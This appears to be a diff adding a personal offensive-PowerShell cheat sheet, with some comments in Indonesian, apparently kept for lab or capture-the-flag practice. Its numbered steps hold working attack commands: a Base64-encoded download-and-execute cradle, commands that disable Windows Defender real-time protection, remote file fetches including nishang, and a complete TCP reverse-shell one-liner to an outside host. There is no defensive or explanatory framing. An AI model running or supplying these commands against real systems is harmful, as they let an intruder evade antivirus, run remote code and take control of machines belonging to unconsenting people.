@@ -1,0 +1,25 @@
+1. encode payload powershell B64 
+---------------
+[ --- encode
+$Command = "IEX(New-Object Net.WebClient).downloadString('http://192.168.2.27/ni.ps1')"
+$Encoded = [convert]::ToBase64String([System.Text.encoding]::Unicode.GetBytes($Command))
+Write-Host "Command: " $Command
+
+#show encoded command
+Write-Host "Encoded command: powershell.exe -execution bypass -encoded " $Encoded
+
+2. bypass AV / win defender
+Set-MpPreference -DisableIOAVProtection $true -Verbose
+Set-MpPreference -DisableRealtimeMonitoring $true -Verbose
+
+3. powershell upload file
+#Invoke-WebRequest -Uri "http://10.10.14.5:8000/c.exe" -OutFile "C:\Users\Public\Documents\c.exe" ==> upload file
+#powershell -ExecutionPolicy Bypass -Command "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.84:33/ns.ps1')"  ==> upload, langsung execute buat nishang boleh
+
+4. revshell
+a.one liner
+#powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.42',9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
+5. PS enter-pssession
+echo Enter-PSSession -ComputerName localhost -Credential $cred >> st.ps1
+
